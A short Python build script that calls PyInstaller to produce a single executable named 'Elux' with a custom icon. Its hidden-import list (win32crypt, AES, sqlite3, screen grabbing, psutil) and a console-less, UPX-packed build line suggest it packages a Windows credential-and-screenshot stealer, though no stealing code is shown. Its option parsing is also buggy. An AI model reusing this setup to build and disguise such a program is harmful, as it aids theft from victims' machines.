import os
import sys, getopt

def main(argv):
    inputfile = None
    iconfile = None
    opts, args = getopt.getopt(argv,"hi:o:",["ifile=","icofile="])
    for opt, arg in opts:
        if opt == '-h':
            print ('pyinstaller.py -i <inputfile> -ico <iconfile>')
            sys.exit()
        elif opt in ("-i", "--ifile"):
            inputfile = arg
        elif opt in ("-ico", "--icofile"):
            iconfile = arg
    print ('Input file is ', inputfile)
    print ('Output file is ', iconfile)
    hip = "--hidden-import"
    exeicon = "Elux"
    filename = "Elux"
    if inputfile != None:
        filename = inputfile
    if iconfile != None:
        exeicon = iconfile
        
    imps = {
        "base64",
        "ctypes",
        "json",
        "re",
        "time",
        "subprocess",
        "sys",
        "sqlite3",
        "requests_toolbelt",
        "psutil",
        "PIL",
        "PIL.ImageGrab",
        "Crypto",
        "Crypto.Cipher.AES",
        "win32crypt"
    }
    lol = ""
    for l in imps:
        lol += " "+hip+" "+l
        print(l)
    ha = "python "+"-m "+"PyInstaller "+"--onefile "+"--clean "+"--noconsole "+"--upx-dir=./tools "+"--distpath=./ "+lol+" --icon "+exeicon+f" ./{filename}.py"
    ha = "python "+"-m "+"PyInstaller "+"--onefile "+"--clean "+"--upx-dir=./tools "+"--distpath=./ --icon ./"+exeicon+f".ico ./{filename}.py"
    print(ha)
    os.system(ha)


if __name__ == "__main__":
   main(sys.argv[1:])
